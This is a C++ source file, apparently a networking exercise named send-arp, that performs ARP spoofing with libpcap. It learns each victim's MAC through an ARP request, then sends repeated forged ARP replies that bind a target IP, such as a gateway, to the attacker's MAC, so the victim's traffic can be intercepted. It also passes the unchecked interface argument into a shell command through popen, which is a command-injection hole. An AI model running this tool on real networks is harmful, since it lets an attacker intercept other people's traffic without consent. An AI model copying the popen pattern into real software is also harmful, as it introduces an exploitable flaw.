#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <stdlib.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 1.1.1.1 2.2.2.2\n");
}

void send_arp(pcap_t* handle, char* attacker_ip, char *attacker_mac, char* target_ip){
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(attacker_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(target_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
}

void reply_arp(pcap_t* handle, const char* attacker_mac, const char* sender_mac, char* target_ip){
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(target_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
}


int main(int argc, char* argv[]){
	printf("%d\n",argc);
	if (argc < 4 || argc %2 ==1) {
		usage();
		return -1;
	}
	char command[200];
    char my_mac[18];
	char my_ip[16];
	snprintf(command, sizeof(command), "ifconfig %s | grep ether | awk '{print $2}'", argv[1]);
    FILE *fp = popen(command, "r");
    if (fp == NULL) {
        perror("popen failed");
        return 1;
    }

    if (fgets(my_mac, sizeof(my_mac), fp) != NULL) {
        my_mac[strcspn(my_mac, "\n")] = 0;
        //printf("MAC Address: %s\n", my_mac);
	}

	snprintf(command, sizeof(command), "ifconfig %s | grep inet | awk '{print $2}'", argv[1]);
    fp = popen(command, "r");
    if (fp == NULL) {
        perror("popen failed");
        return 1;
    }

    if (fgets(my_ip, sizeof(my_ip), fp) != NULL) {
        my_ip[strcspn(my_ip, "\n")] = 0;
        //printf("IP Address: %s\n", my_ip);
	}


	//spcap_open_live(dev, BUFSIZ, 1, 1, errbuf)
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if ( pcap == NULL) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	int i = 1;
	while (i <= (argc-1)/2){
			while (true) {
				send_arp(pcap, my_ip, my_mac, argv[(i*2)]);
				struct pcap_pkthdr* header;
				const u_char* packet;
				int res = pcap_next_ex(pcap, &header, &packet);
		
				if (res == 0) continue;
				if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
					printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
					break;
				}
				//EthArpPacket packet;
				struct EthHdr *ether = (struct EthHdr *) packet;
		
				struct ArpHdr *arpheader = (struct ArpHdr *) (packet + sizeof(struct EthHdr));	

				char sender_ip[INET_ADDRSTRLEN];
            	inet_ntop(AF_INET, &(arpheader->sip_), sender_ip, INET_ADDRSTRLEN);

				//printf("Sender IP: %s\n", sender_ip);
				//printf("Sender MAC: %s\n", std::string(arpheader->smac_).c_str());

				if (strcmp(sender_ip, argv[i*2]) == 0) {
    				//printf("ARP sender IP matches with argv[1]: %s\n", argv[1]);
					//One packet is not enough
					for(int j = 0; j< 10; j++){
						reply_arp(pcap, my_mac, std::string(arpheader->smac_).c_str(), argv[i*2+1]);
					}
					break;
				}

				
			}
		
		i++;
		}

	pcap_close(pcap);

}
